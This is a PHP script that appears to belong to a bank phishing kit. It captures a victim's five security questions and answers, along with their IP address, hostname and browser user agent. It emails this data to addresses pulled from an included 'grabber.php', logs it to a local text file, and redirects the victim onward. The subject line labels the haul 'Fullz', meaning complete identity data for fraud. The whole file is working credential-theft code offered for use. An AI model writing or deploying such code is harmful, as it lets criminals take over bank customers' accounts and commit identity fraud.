<?php
ob_start();
session_start();
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
if($_POST["qus1"] != "" and $_POST["ans1"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "==================+[ B0@ Billy Info ]+==================\n";
$message .= "|question1 : ".$_POST['qus1']."\n";
$message .= "|answer1: ".$_POST['ans1']."\n";
$message .= "|question2 : ".$_POST['qus2']."\n";
$message .= "|answer2: ".$_POST['ans2']."\n";
$message .= "|question3 : ".$_POST['qus3']."\n";
$message .= "|answer3: ".$_POST['ans3']."\n";

$message .= "|question4 : ".$_POST['qus4']."\n";
$message .= "|answer4: ".$_POST['ans4']."\n";
$message .= "|question5 : ".$_POST['qus5']."\n";
$message .= "|answer5: ".$_POST['ans5']."\n";

$message .= "-----------------+  +-----------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "-----------------+  +-----------------\n";
include 'grabber.php';
$subject = "$UserID | BOOOOOOA Fullz";
mail(','.$form,$subject,$message);
    $text = fopen('sgh.txt', 'a');
fwrite($text, $message);
mail($to,$subject,$message);
$praga=(rand(10,100));

$Redirect="silent-ajax.php?$asp&Reason=$axp&ref=ovr";
header("Location: $Redirect");
} 

?>

 
 